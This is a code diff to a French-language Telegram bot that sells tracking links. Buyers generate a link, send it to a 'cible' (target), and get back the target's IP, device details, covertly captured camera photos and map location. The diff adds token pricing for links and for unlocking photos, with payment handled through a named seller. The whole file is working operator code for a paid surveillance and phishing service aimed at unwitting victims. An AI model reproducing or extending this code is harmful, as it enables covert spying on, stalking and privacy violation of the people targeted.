@@ -8,6 +8,11 @@ const crypto = require("crypto");
 // Configuration de l'environnement
 dotenv.config();
 
+// --- CONFIGURATION DES TARIFS ---
+const PRIX_GENERATION = 3;  // Coût pour créer un lien
+const PRIX_PHOTOS = 3;      // Coût pour voir les photos
+const NB_PHOTOS_A_AFFICHER = 3; // Nombre de photos à envoyer
+
 // --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
 const dataDir = path.join(__dirname, 'data');
 if (!fs.existsSync(dataDir)) {
@@ -68,7 +73,7 @@ const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;
 let isAdminMode = false;
 
 console.log(`🤖 Bot Telegram démarré !`);
-console.log(`📡 Connecté au backend : ${BASE_URL}`);
+console.log(`💰 Tarifs : Gen=${PRIX_GENERATION}🪙 / Photos=${PRIX_PHOTOS}🪙`);
 
 // --- 3. COMMANDES ADMINISTRATEUR ---
 
@@ -101,54 +106,51 @@ bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
 
 // --- 4. COMMANDES UTILISATEUR & VENTE ---
 
-// /start
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     const coins = usersData[chatId]?.coins || 0;
     
     bot.sendMessage(chatId, 
         `🔥 *Bot de Capture Activé !*\n\n` +
-        `💰 *Votre Solde :* ${coins} jetons\n\n` +
+        `💰 *Solde :* ${coins} jetons\n\n` +
+        `📋 *Tarifs :*\n` +
+        `• Générer un lien : ${PRIX_GENERATION} 🪙\n` +
+        `• Voir les photos : ${PRIX_PHOTOS} 🪙\n\n` +
         `🎯 *Menu :* \n` +
-        `/generate - Créer un lien (1 🪙)\n` +
+        `/generate - Créer un lien\n` +
         `/acheter - Acheter des jetons 💎\n` +
-        `/balance - Voir mon solde\n` +
-        `/help - Aide`, 
+        `/balance - Voir mon solde`, 
         { parse_mode: "Markdown" }
     );
 });
 
-// /acheter (COMMANDE DE VENTE)
 bot.onText(/\/acheter/, (msg) => {
     const chatId = msg.chat.id;
     bot.sendMessage(chatId, 
         `💎 **ACHETER DES JETONS** 💎\n\n` +
-        `Pour recharger votre compte, contactez :\n` +
-        `👉 **@DsSiaka**\n\n` +
-        `🆔 **Ton ID à lui donner :** \`${chatId}\`\n\n` +
-        `⚡ Paiement rapide et recharge immédiate !`, 
+        `Vendeur officiel : 👉 **@DsSiaka**\n\n` +
+        `🆔 **Ton ID :** \`${chatId}\`\n\n` +
+        `⚡ Recharge immédiate après paiement !`, 
         { parse_mode: "Markdown" }
     );
 });
 
-// /balance
 bot.onText(/\/balance/, (msg) => {
     const coins = usersData[msg.chat.id]?.coins || 0;
     bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
 });
 
-// /generate (GÉNÉRATION AVEC VÉRIFICATION)
+// --- 5. GÉNÉRATION DE LIENS (COÛT 3 JETONS) ---
 bot.onText(/\/generate/, (msg) => {
     const chatId = msg.chat.id;
     const coins = usersData[chatId]?.coins || 0;
 
-    // --- MODIFICATION ICI : MESSAGE SOLDE INSUFFISANT ---
-    if (coins <= 0) {
+    if (coins < PRIX_GENERATION) {
         return bot.sendMessage(chatId, 
             `⚠️ **Solde insuffisant !**\n\n` +
-            `Il vous faut 1 jeton pour générer un lien.\n\n` +
-            `🛒 **Pour recharger votre compte :**\n` +
-            `Contactez l'administrateur 👉 **@DsSiaka**`, 
+            `Coût de génération : ${PRIX_GENERATION} jetons.\n` +
+            `Votre solde : ${coins} jetons.\n\n` +
+            `🛒 Contactez **@DsSiaka** pour recharger.`, 
             { parse_mode: "Markdown" }
         );
     }
@@ -162,37 +164,58 @@ bot.onText(/\/generate/, (msg) => {
         }
     };
 
-    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nSolde : ${coins} 🪙\nCoût : 1 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
+    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nCoût : ${PRIX_GENERATION} 🪙\nSolde actuel : ${coins} 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
 });
 
-// --- 5. GESTION DES CLICS ---
+// --- 6. GESTION DES ACTIONS (CALLBACKS) ---
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
+    // Cas A : Voir les données (texte gratuit)
     if (data.startsWith("data_")) {
         bot.answerCallbackQuery(query.id);
         const linkId = data.replace("data_", "");
-        await sendDataById(chatId, linkId);
+        await sendDataPreview(chatId, linkId);
         return;
     }
 
+    // Cas B : Acheter les photos (COÛT 3 JETONS)
+    if (data.startsWith("buyphotos_")) {
+        const linkId = data.replace("buyphotos_", "");
+        
+        // Vérification solde
+        if (!usersData[chatId] || usersData[chatId].coins < PRIX_PHOTOS) {
+            return bot.answerCallbackQuery(query.id, { text: `❌ Pas assez de jetons ! Il en faut ${PRIX_PHOTOS}.`, show_alert: true });
+        }
+
+        // Paiement
+        usersData[chatId].coins -= PRIX_PHOTOS;
+        saveUsers();
+        
+        bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-${PRIX_PHOTOS} 🪙)` });
+        await sendPhotos(chatId, linkId); // Envoi des photos
+        return;
+    }
+
+    // Cas C : Générer un lien
     const platform = data;
     
-    // --- MODIFICATION ICI : ALERTE SOLDE INSUFFISANT ---
-    if (!usersData[chatId] || usersData[chatId].coins <= 0) {
-        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka pour recharger.");
-        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant ! Contactez @DsSiaka", show_alert: true });
+    // Vérification solde génération
+    if (!usersData[chatId] || usersData[chatId].coins < PRIX_GENERATION) {
+        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka.");
+        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
     }
 
     try {
         const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
         const { id, url } = response.data;
 
-        usersData[chatId].coins -= 1;
+        // Déduction coût génération
+        usersData[chatId].coins -= PRIX_GENERATION;
         saveUsers();
 
-        bot.answerCallbackQuery(query.id, { text: "✅ Lien généré ! -1 Jeton" });
+        bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });
 
         const message = `✅ *LIEN CRÉÉ !*\n\n` +
                         `🔗 ${url}\n\n` +
@@ -216,20 +239,21 @@ bot.on("callback_query", async (query) => {
     }
 });
 
-// --- 6. AFFICHAGE DONNÉES ---
+// --- 7. AFFICHAGE DONNÉES & PHOTOS ---
 
 bot.onText(/\/data (.+)/, async (msg, match) => {
-    await sendDataById(msg.chat.id, match[1].trim());
+    await sendDataPreview(msg.chat.id, match[1].trim());
 });
 
-async function sendDataById(chatId, linkId) {
+// Fonction 1 : Aperçu GRATUIT (Texte uniquement)
+async function sendDataPreview(chatId, linkId) {
     try {
         const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
             headers: { Authorization: `Bearer ${authToken}` },
         });
         const data = response.data;
+        const photoCount = data.images ? data.images.length : 0;
 
-        // 1. Envoyer le résumé texte d'abord
         let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
         message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
         message += `🌐 IP: ${data.ip || "Masquée"}\n`;
@@ -242,50 +266,73 @@ async function sendDataById(chatId, linkId) {
             message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
         }
 
-        const photoCount = data.images ? data.images.length : 0;
-        message += `📸 Photos capturées : ${photoCount}`;
-
-        await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
-
-        // 2. ENVOYER TOUTES LES PHOTOS (BOUCLE)
+        message += `\n📸 *Photos disponibles :* ${photoCount}\n`;
+        
+        // Bouton pour ACHETER les photos si elles existent
+        const keyboard = { reply_markup: { inline_keyboard: [] } };
+        
         if (photoCount > 0) {
-            await bot.sendMessage(chatId, `🚀 **Envoi de la galerie (${photoCount} photos)...**`);
-            
-            // On boucle sur chaque image trouvée
-            for (let i = 0; i < photoCount; i++) {
-                try {
-                    const imgBuffer = Buffer.from(data.images[i], "base64");
-                    await bot.sendPhoto(chatId, imgBuffer, { 
-                        caption: `📸 Photo ${i + 1} sur ${photoCount}` 
-                    });
-                } catch (err) {
-                    console.error(`Erreur photo ${i}:`, err.message);
-                }
-            }
+            message += `🔒 *Les photos sont verrouillées.*\nCoût de déblocage : ${PRIX_PHOTOS} 🪙`;
+            keyboard.reply_markup.inline_keyboard.push([
+                { text: `📸 Voir les ${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
+            ]);
         } else {
-            bot.sendMessage(chatId, "❌ Aucune photo capturée pour ce lien.");
+            message += `⚠️ Aucune photo capturée.`;
         }
 
-        // 3. Envoyer la carte si localisation dispo
-        if (data.location && data.location.latitude) {
-            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
-            bot.sendMessage(chatId, `🗺️ [Voir sur la carte](${mapsUrl})`, { parse_mode: "Markdown", disable_web_page_preview: false });
-        }
+        await bot.sendMessage(chatId, message, { parse_mode: "Markdown", ...keyboard });
 
     } catch (error) {
-        console.error(error);
-        bot.sendMessage(chatId, `❌ **Erreur :** Impossible de récupérer les données pour \`${linkId}\`.\nVérifie que l'ID est correct.`, { parse_mode: "Markdown" });
+        bot.sendMessage(chatId, `❌ Données introuvables pour \`${linkId}\``);
     }
 }
 
-// /help (MODIFICATION ICI : AJOUT CONTACT)
+// Fonction 2 : Envoi des PHOTOS (PAYANT)
+async function sendPhotos(chatId, linkId) {
+    try {
+        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
+            headers: { Authorization: `Bearer ${authToken}` },
+        });
+        const data = response.data;
+        
+        if (!data.images || data.images.length === 0) return;
+
+        await bot.sendMessage(chatId, `🔓 **Photos débloquées !** Envoi en cours...`);
+
+        // BOUCLE POUR AFFICHER LES 3 PHOTOS
+        const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);
+        
+        for (let i = 0; i < limit; i++) {
+            try {
+                const imgBuffer = Buffer.from(data.images[i], "base64");
+                await bot.sendPhoto(chatId, imgBuffer, { 
+                    caption: `📸 Photo ${i + 1}/${limit}` 
+                });
+            } catch (err) {
+                console.error(`Erreur image ${i}:`, err);
+            }
+        }
+        
+        // Envoi de la localisation en bonus
+        if (data.location && data.location.latitude) {
+            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
+            bot.sendMessage(chatId, `🗺️ [Voir position sur Maps](${mapsUrl})`, { parse_mode: "Markdown" });
+        }
+
+    } catch (error) {
+        bot.sendMessage(chatId, "❌ Erreur lors de l'envoi des photos.");
+    }
+}
+
+// /help
 bot.onText(/\/help/, (msg) => {
     bot.sendMessage(msg.chat.id, 
         `📚 *AIDE*\n\n` +
-        `1. /generate pour créer un lien.\n` +
-        `2. Envoie le lien à ta cible.\n` +
-        `3. Reçois les photos et la position ici.\n\n` +
-        `💎 **Besoin de jetons ?**\nContactez l'admin : **@DsSiaka**`, 
+        `1. /generate (Coût ${PRIX_GENERATION}🪙) pour créer le lien.\n` +
+        `2. Envoie le lien à la cible.\n` +
+        `3. Reçois le rapport texte.\n` +
+        `4. Débloque les photos (Coût ${PRIX_PHOTOS}🪙).\n\n` +
+        `💎 **Recharge :** @DsSiaka`, 
         { parse_mode: "Markdown" }
     );
 });
